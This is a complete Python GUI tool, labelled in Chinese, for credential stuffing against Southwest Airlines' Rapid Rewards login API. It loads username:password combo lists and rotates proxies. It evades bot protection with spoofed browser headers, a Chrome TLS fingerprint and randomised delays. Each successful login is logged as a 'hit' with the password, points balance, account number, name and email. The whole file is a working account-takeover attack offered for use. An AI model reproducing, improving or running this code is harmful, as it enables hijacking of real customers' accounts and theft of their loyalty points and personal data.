import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext, messagebox
import requests
import concurrent.futures
import threading
import time
import random
import queue
from itertools import cycle
from urllib.parse import urlencode
import os
import sys

# 可选：更强 TLS 指纹（强烈推荐安装）
# pip install curl_cffi
try:
    from curl_cffi import requests as cf_requests
    USE_CFFI = True
except ImportError:
    USE_CFFI = False
    print("提示: 未安装 curl_cffi，仍用普通 requests（403 概率更高）。建议: pip install curl_cffi")

LOGIN_URL = "https://www.southwest.com/api/security/v4/security/token"
USERINFO_URL = "https://www.southwest.com/api/security/v4/security/userinfo"
HOME_URL = "https://www.southwest.com/"
CLIENT_ID = "6b6199ac-6726-4642-b5bd-86eb07062161"

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

class SWACheckerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SWA RR Checker (403-fixed)")
        self.root.geometry("960x750")
        self.root.minsize(820, 620)

        self.stop_flag = False
        self.running = False
        self.log_queue = queue.Queue()
        self.hits = []
        self.total = 0
        self.checked = 0
        self.hit_count = 0
        self.proxy_cycle = None
        self.proxy_lock = threading.Lock()

        self.build_ui()
        self.poll_log()

    def build_ui(self):
        main = ttk.Frame(self.root, padding=10)
        main.pack(fill=tk.BOTH, expand=True)

        conf = ttk.LabelFrame(main, text="配置", padding=8)
        conf.pack(fill=tk.X, pady=(0, 8))

        ttk.Label(conf, text="账号文件 (user:pass):").grid(row=0, column=0, sticky="w", padx=4, pady=4)
        self.combo_path = tk.StringVar()
        ttk.Entry(conf, textvariable=self.combo_path, width=58).grid(row=0, column=1, padx=4, pady=4, sticky="ew")
        ttk.Button(conf, text="浏览…", command=self.browse_combo).grid(row=0, column=2, padx=4, pady=4)

        ttk.Label(conf, text="代理文件 (每行一条):").grid(row=1, column=0, sticky="w", padx=4, pady=4)
        self.proxy_path = tk.StringVar()
        ttk.Entry(conf, textvariable=self.proxy_path, width=58).grid(row=1, column=1, padx=4, pady=4, sticky="ew")
        ttk.Button(conf, text="浏览…", command=self.browse_proxy).grid(row=1, column=2, padx=4, pady=4)

        ttk.Label(conf, text="支持: http://user:pass@ip:port | user:pass@ip:port | ip:port | socks5://...",
                  font=("", 8), foreground="#555").grid(row=2, column=1, sticky="w", padx=4)

        ttk.Label(conf, text="HIT 保存路径:").grid(row=3, column=0, sticky="w", padx=4, pady=4)
        self.hits_path = tk.StringVar(value="swa_hits.txt")
        ttk.Entry(conf, textvariable=self.hits_path, width=58).grid(row=3, column=1, padx=4, pady=4, sticky="ew")
        ttk.Button(conf, text="浏览…", command=self.browse_hits).grid(row=3, column=2, padx=4, pady=4)

        conf.columnconfigure(1, weight=1)

        param = ttk.Frame(main)
        param.pack(fill=tk.X, pady=(0, 8))

        ttk.Label(param, text="线程数:").pack(side=tk.LEFT, padx=(0, 4))
        self.threads_var = tk.IntVar(value=2)  # 默认降到 2
        ttk.Spinbox(param, from_=1, to=20, textvariable=self.threads_var, width=5).pack(side=tk.LEFT, padx=(0, 12))

        ttk.Label(param, text="延迟下限(秒):").pack(side=tk.LEFT, padx=(0, 4))
        self.delay_min = tk.DoubleVar(value=1.5)
        ttk.Spinbox(param, from_=0.5, to=15.0, increment=0.1, textvariable=self.delay_min, width=5).pack(side=tk.LEFT, padx=(0, 12))

        ttk.Label(param, text="延迟上限(秒):").pack(side=tk.LEFT, padx=(0, 4))
        self.delay_max = tk.DoubleVar(value=4.0)
        ttk.Spinbox(param, from_=1.0, to=20.0, increment=0.1, textvariable=self.delay_max, width=5).pack(side=tk.LEFT, padx=(0, 12))

        self.use_proxy = tk.BooleanVar(value=True)
        ttk.Checkbutton(param, text="启用代理", variable=self.use_proxy).pack(side=tk.LEFT, padx=(0, 12))

        self.pull_userinfo = tk.BooleanVar(value=False)
        ttk.Checkbutton(param, text="额外拉 userinfo", variable=self.pull_userinfo).pack(side=tk.LEFT, padx=(0, 12))

        self.warm_session = tk.BooleanVar(value=True)
        ttk.Checkbutton(param, text="预热首页", variable=self.warm_session).pack(side=tk.LEFT)

        btnf = ttk.Frame(main)
        btnf.pack(fill=tk.X, pady=(0, 8))

        self.start_btn = ttk.Button(btnf, text="▶ 开始检查", command=self.start_check)
        self.start_btn.pack(side=tk.LEFT, padx=4)
        self.stop_btn = ttk.Button(btnf, text="■ 停止", command=self.stop_check, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=4)
        ttk.Button(btnf, text="清空日志", command=self.clear_log).pack(side=tk.LEFT, padx=4)
        ttk.Button(btnf, text="打开 HIT 文件", command=self.open_hits).pack(side=tk.LEFT, padx=4)
        ttk.Button(btnf, text="导出当前 HIT", command=self.export_hits).pack(side=tk.LEFT, padx=4)
        ttk.Button(btnf, text="测试单个代理", command=self.test_one_proxy).pack(side=tk.LEFT, padx=4)

        prog = ttk.Frame(main)
        prog.pack(fill=tk.X, pady=(0, 4))
        self.progress = ttk.Progressbar(prog, mode="determinate")
        self.progress.pack(fill=tk.X, side=tk.LEFT, expand=True, padx=(0, 8))
        self.stats_label = ttk.Label(prog, text="等待中 | 0/0 | HIT: 0", width=40)
        self.stats_label.pack(side=tk.RIGHT)

        paned = ttk.Panedwindow(main, orient=tk.VERTICAL)
        paned.pack(fill=tk.BOTH, expand=True)

        log_frame = ttk.LabelFrame(paned, text="运行日志（含 proxy + status + body 片段）", padding=4)
        self.log_text = scrolledtext.ScrolledText(log_frame, height=18, font=("Consolas", 9), wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        paned.add(log_frame, weight=3)

        hit_frame = ttk.LabelFrame(paned, text="HIT 实时列表", padding=4)
        self.hit_text = scrolledtext.ScrolledText(hit_frame, height=8, font=("Consolas", 9), wrap=tk.WORD, fg="#0a0")
        self.hit_text.pack(fill=tk.BOTH, expand=True)
        paned.add(hit_frame, weight=1)

        self.status = ttk.Label(main, text="就绪 — 选账号+代理后点开始。推荐住宅/移动代理 + curl_cffi", relief=tk.SUNKEN, anchor="w")
        self.status.pack(fill=tk.X, pady=(6, 0))

    def browse_combo(self):
        p = filedialog.askopenfilename(title="选择账号文件", filetypes=[("Text", "*.txt"), ("All", "*.*")])
        if p:
            self.combo_path.set(p)

    def browse_proxy(self):
        p = filedialog.askopenfilename(title="选择代理文件", filetypes=[("Text", "*.txt"), ("All", "*.*")])
        if p:
            self.proxy_path.set(p)

    def browse_hits(self):
        p = filedialog.asksaveasfilename(title="HIT 保存路径", defaultextension=".txt", filetypes=[("Text", "*.txt")])
        if p:
            self.hits_path.set(p)

    def log(self, msg):
        self.log_queue.put(msg)

    def poll_log(self):
        try:
            while True:
                msg = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, msg + "\n")
                self.log_text.see(tk.END)
        except queue.Empty:
            pass
        self.root.after(80, self.poll_log)

    def clear_log(self):
        self.log_text.delete("1.0", tk.END)
        self.hit_text.delete("1.0", tk.END)

    def open_hits(self):
        path = self.hits_path.get().strip()
        if path and os.path.isfile(path):
            if os.name == "nt":
                os.startfile(path)
            elif sys.platform == "darwin":
                os.system(f'open "{path}"')
            else:
                os.system(f'xdg-open "{path}"')
        else:
            messagebox.showinfo("提示", "HIT 文件还不存在")

    def export_hits(self):
        if not self.hits:
            messagebox.showinfo("提示", "当前没有 HIT")
            return
        p = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text", "*.txt")])
        if p:
            with open(p, "w", encoding="utf-8") as f:
                f.write("\n".join(self.hits) + "\n")
            messagebox.showinfo("完成", f"已导出 {len(self.hits)} 条 → {p}")

    def normalize_proxy(self, line):
        line = line.strip()
        if not line or line.startswith("#"):
            return None
        if line.startswith(("http://", "https://", "socks5://", "socks4://", "socks://")):
            return line
        if "@" in line:
            return "http://" + line
        return "http://" + line

    def load_proxies(self):
        path = self.proxy_path.get().strip()
        if not path or not os.path.isfile(path):
            return []
        with open(path, encoding="utf-8", errors="ignore") as f:
            px = [self.normalize_proxy(l) for l in f]
        return [p for p in px if p]

    def load_combos(self):
        path = self.combo_path.get().strip()
        if not path or not os.path.isfile(path):
            return []
        with open(path, encoding="utf-8", errors="ignore") as f:
            return [l.strip() for l in f if ":" in l and not l.strip().startswith("#")]

    def get_next_proxy(self):
        if not self.proxy_cycle:
            return None
        with self.proxy_lock:
            return next(self.proxy_cycle)

    def make_session(self, proxy=None):
        if USE_CFFI:
            s = cf_requests.Session()
            # chrome 指纹
            s.impersonate = "chrome120"
        else:
            s = requests.Session()
        if proxy:
            s.proxies = {"http": proxy, "https": proxy}
        return s

    def build_headers(self):
        ua = random.choice(UA_LIST)
        return {
            "User-Agent": ua,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.southwest.com",
            "Referer": "https://www.southwest.com/",
            "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "Connection": "keep-alive",
        }

    def check_one(self, combo):
        if self.stop_flag:
            return None
        combo = combo.strip()
        if ":" not in combo:
            return f"SKIP|{combo}"
        user, pwd = combo.split(":", 1)
        proxy = self.get_next_proxy() if self.use_proxy.get() else None

        headers = self.build_headers()
        data = {
            "username": user,
            "password": pwd,
            "scope": "openid",
            "response_type": "id_token swa_token",
            "client_id": CLIENT_ID,
        }

        try:
            s = self.make_session(proxy)

            # 预热首页拿 cookie
            if self.warm_session.get():
                try:
                    s.get(HOME_URL, headers={"User-Agent": headers["User-Agent"], "Accept": "text/html"}, timeout=15)
                    time.sleep(random.uniform(0.3, 0.8))
                except Exception as e:
                    return f"ERR|{user}|warm_fail|{type(e).__name__}:{e}|proxy={proxy}"

            r = s.post(LOGIN_URL, headers=headers, data=urlencode(data), timeout=22)

            body_snip = (r.text or "")[:220].replace("\n", " ")
            if r.status_code == 403:
                return f"BAD|{user}|http_403|proxy={proxy}|body={body_snip!r}"
            if r.status_code != 200:
                return f"BAD|{user}|http_{r.status_code}|proxy={proxy}|body={body_snip!r}"

            try:
                j = r.json()
            except Exception:
                return f"BAD|{user}|not_json|proxy={proxy}|body={body_snip!r}"

            access = j.get("access_token")
            points = j.get("customers.userInformation.redeemablePoints") or j.get("redeemablePoints")
            acct = j.get("customers.userInformation.accountNumber") or user
            email = j.get("customers.userInformation.primaryEmail") or ""
            name = f"{j.get('customers.userInformation.firstName', '')} {j.get('customers.userInformation.lastName', '')}".strip()
            tier = j.get("customers.userInformation.tier") or ""
            status = j.get("customers.userInformation.accountStatus") or ""

            if not access and points is None and "id_token" not in j:
                return f"BAD|{user}|no_token|proxy={proxy}|body={body_snip!r}"

            if self.pull_userinfo.get() and access and points is None:
                try:
                    uh = dict(headers)
                    uh["Authorization"] = f"Bearer {access}"
                    if j.get("id_token"):
                        uh["X-API-IDTOKEN"] = j["id_token"]
                    ur = s.get(USERINFO_URL, headers=uh, timeout=15)
                    if ur.status_code == 200:
                        uj = ur.json()
                        ui = (uj.get("customers") or {}).get("UserInformation") or (uj.get("customers") or {}).get("userInformation") or {}
                        points = ui.get("redeemablePoints") or points
                        email = email or ui.get("primaryEmail") or ""
                except Exception:
                    pass

            pts = points if points is not None else "unknown"
            return f"HIT|{user}:{pwd}|points:{pts}|acct:{acct}|name:{name}|email:{email}|tier:{tier}|status:{status}|proxy={proxy}"

        except Exception as e:
            return f"ERR|{user}|{type(e).__name__}:{e}|proxy={proxy}"

    def worker_done(self, fut):
        self.checked += 1
        try:
            res = fut.result()
        except Exception as e:
            res = f"ERR|future|{e}"
        if res is None:
            return
        self.log(res)
        if res.startswith("HIT|"):
            self.hit_count += 1
            self.hits.append(res)
            self.hit_text.insert(tk.END, res + "\n")
            self.hit_text.see(tk.END)
            try:
                with open(self.hits_path.get().strip() or "swa_hits.txt", "a", encoding="utf-8") as o:
                    o.write(res + "\n")
            except Exception as e:
                self.log(f"写HIT失败: {e}")
        pct = (self.checked / self.total * 100) if self.total else 0
        self.progress["value"] = pct
        self.stats_label.config(text=f"已检 {self.checked}/{self.total} | HIT: {self.hit_count}")
        if self.checked >= self.total and self.running:
            self.running = False
            self.start_btn.config(state=tk.NORMAL)
            self.stop_btn.config(state=tk.DISABLED)
            self.status.config(text=f"完成 | HIT: {self.hit_count}")
            self.log("===== 全部完成 =====")

    def start_check(self):
        if self.running:
            return
        combos = self.load_combos()
        if not combos:
            messagebox.showwarning("提示", "请先选择有效的账号文件")
            return
        proxies = self.load_proxies() if self.use_proxy.get() else []
        if self.use_proxy.get() and not proxies:
            messagebox.showwarning("提示", "启用了代理但代理文件为空/无效")
            return

        self.stop_flag = False
        self.running = True
        self.hits.clear()
        self.checked = 0
        self.hit_count = 0
        self.total = len(combos)
        self.progress["value"] = 0
        self.stats_label.config(text=f"已检 0/{self.total} | HIT: 0")
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.status.config(text="运行中…")
        self.log(f"开始 | 账号:{self.total} | 代理:{len(proxies)} | curl_cffi:{USE_CFFI} | 线程:{self.threads_var.get()}")

        if proxies:
            random.shuffle(proxies)
            self.proxy_cycle = cycle(proxies)
        else:
            self.proxy_cycle = None

        def runner():
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads_var.get()) as ex:
                futs = []
                for c in combos:
                    if self.stop_flag:
                        break
                    fut = ex.submit(self.check_one, c)
                    fut.add_done_callback(lambda f: self.root.after(0, self.worker_done, f))
                    futs.append(fut)
                    time.sleep(random.uniform(self.delay_min.get(), self.delay_max.get()) / max(1, self.threads_var.get()))
                concurrent.futures.wait(futs)
            if not self.stop_flag:
                self.root.after(0, lambda: self.log("===== 队列结束 ====="))

        threading.Thread(target=runner, daemon=True).start()

    def stop_check(self):
        self.stop_flag = True
        self.running = False
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.status.config(text="已停止")
        self.log("===== 用户停止 =====")

    def test_one_proxy(self):
        """快速验证代理是否能过首页 + token 接口（不带账号）"""
        proxies = self.load_proxies()
        if not proxies:
            messagebox.showinfo("提示", "先加载代理文件")
            return
        proxy = proxies[0]
        self.log(f"测试代理: {proxy}")
        try:
            s = self.make_session(proxy)
            r1 = s.get(HOME_URL, headers={"User-Agent": UA_LIST[0]}, timeout=15)
            self.log(f"  首页 → {r1.status_code} | len={len(r1.text)}")
            headers = self.build_headers()
            data = {"username": "test", "password": "test", "scope": "openid",
                    "response_type": "id_token swa_token", "client_id": CLIENT_ID}
            r2 = s.post(LOGIN_URL, headers=headers, data=urlencode(data), timeout=15)
            snip = (r2.text or "")[:180].replace("\n", " ")
            self.log(f"  token → {r2.status_code} | body={snip!r}")
            if r2.status_code == 403:
                self.log("  → 此代理被 WAF 拦（换住宅/移动或换供应商）")
            elif r2.status_code in (200, 400, 401):
                self.log("  → 代理基本可用（400/401 是账号错，正常）")
            else:
                self.log(f"  → 异常状态 {r2.status_code}")
        except Exception as e:
            self.log(f"  测试失败: {type(e).__name__}: {e}")

if __name__ == "__main__":
    root = tk.Tk()
    app = SWACheckerGUI(root)
    root.mainloop()
